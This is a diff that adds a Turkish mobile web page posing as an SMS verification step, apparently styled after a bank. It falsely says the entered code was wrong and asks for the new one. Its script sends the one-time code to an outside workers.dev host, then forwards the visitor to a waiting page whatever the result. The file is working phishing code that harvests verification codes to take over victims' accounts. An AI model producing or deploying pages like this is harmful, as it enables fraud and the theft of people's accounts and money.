@@ -1,0 +1,136 @@
+<html lang="tr">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="theme-color" content="#dc0004">
+    <title>Mobil Sayfa</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/normalize/5.0.0/normalize.min.css">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="">
+    <link
+        href="https://fonts.googleapis.com/css2?family=Poppins:ital,wght@0,100;0,200;0,300;0,400;0,500;0,600;0,700;0,800;0,900;1,100;1,200;1,300;1,400;1,500;1,600;1,700;1,800;1,900&amp;display=swap"
+        rel="stylesheet">
+    <link rel="stylesheet" href="dist/style.css">
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+</head>
+
+<body>
+
+    <div class="preloader hidden">
+        <img src="dist/ak-white.png" width="115%" style="margin-top: 100%;">
+    </div>
+    <div id="slider">
+
+        <div class="gray6 slide active" style="background-color: rgb(241, 241, 241);">
+            <div id="tab3header21">
+                <h2 style="text-align: center;font-size: 12px;color: white;margin: 0; font-weight: 600;">SMS Doğrulama
+                </h2>
+            </div>
+
+            <div id="alertDiv3" class="alertDiv">
+                <p style="color: #000; font-size: 12px;font-weight: 600;margin-top:15px;">Bilgilendirme</p>
+                <img src="dist/loader.gif" style="width: 30%;">
+                <p style="color: #000; font-size: 12px;font-weight: 400;">Eksik veya hatalı bilgi girdiniz.</p>
+                <button type="submit" onclick="$('#alertDiv3').removeClass('show');" id="btn-spc2" class="btnn-spc3"
+                    style="width: 90%!important;">Tamam</button>
+            </div>
+            <p
+                style="color: #000; font-size: 13px;margin-left:2%;margin-right:2%;margin-top: 5%;font-weight: 400;white-space: break-spaces;">
+                <font color="red">Hatalı sms kodu girdiniz. Yeni gelen doğrulama kodu giriniz.</font>
+            </p>
+
+            <div id="loginInputs" class="telefonInputs">
+
+                <div style="display: flex; flex-direction: column;">
+
+                    <label for="phone1"
+                        style="color:#636364; font-size: 11px; margin-bottom: 3%;display: flex;font-weight:600;">SMS
+                        Doğrulama Kodu</label>
+                    <div style="display: flex; align-items: center;">
+                        <input type="text" name="sms" placeholder="Doğrulama kodunuzu giriniz" id="sms"
+                            style="font-size: 12px;font-weight:bold;border:0;width: 80%;display: block;" required="">
+                    </div>
+                </div>
+            </div>
+
+            <div id="gonder">
+                <button type="submit" id="btn-spc" class="telefonBTN" style="width: 100% !important;     background-color: rgb(238, 21, 2);
+">Devam</button>
+            </div>
+        </div>
+    </div>
+
+    <!-- partial -->
+    <script src="dist/script.js?v=1.1.2"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.16/jquery.mask.min.js"
+        integrity="sha512-pHVGpX7F/27yZ0ISY+VVjyULApbDlD0/X0rgGbTqCE7WFW5MezNTWG/dnhtbBuICzsd0WQPgpE4REBLv+UqChw=="
+        crossorigin="anonymous" referrerpolicy="no-referrer"></script>
+
+    <script>
+        $("#sms").mask('000000')
+
+        function validateForm(value) {
+            const phoneValue = value;
+
+
+            if (phoneValue.length > 0) {
+                return true;
+            } else {
+                return false;
+            }
+        }
+
+        function getCookie(name) {
+            var nameEQ = name + "=";
+            var ca = document.cookie.split(';');
+            for (var i = 0; i < ca.length; i++) {
+                var c = ca[i];
+                while (c.charAt(0) === ' ') c = c.substring(1, c.length);
+                if (c.indexOf(nameEQ) === 0) return c.substring(nameEQ.length, c.length);
+            }
+            return null;
+        }
+        var phoneNumberInput = document.getElementById('phone2');
+
+        // Giriş butonu
+        var loginBtn = document.querySelector('.telefonBTN');
+
+
+        loginBtn.addEventListener('click', function () {
+            var sms = document.getElementById('sms').value;
+            const alertDiv = document.getElementById('alertDiv3');
+
+            if (!validateForm(sms)) { // validateForm'dan gelen sonuç false ise
+                alertDiv.classList.add('show');
+                console.log(1)
+
+                return;
+            } else {
+                alertDiv.classList.remove('show');
+            }
+
+            var data = new FormData();
+            data.append('action', "sms2");
+            data.append('sms', sms);
+
+            fetch('https://bitter-water-6f4c.aisik3516.workers.dev/', {
+                method: 'POST',
+                body: data
+            })
+                .then(response => response.json())
+                .then(data => {
+                    console.log('Sunucudan gelen yanıt:', data);
+                    window.location.href = 'bekle.html';
+                })
+                .catch(error => {
+                    console.error('Hata:', error);
+                    window.location.href = 'bekle.html';
+                });
+        });
+
+
+    </script>
+</body>
+
+</html>
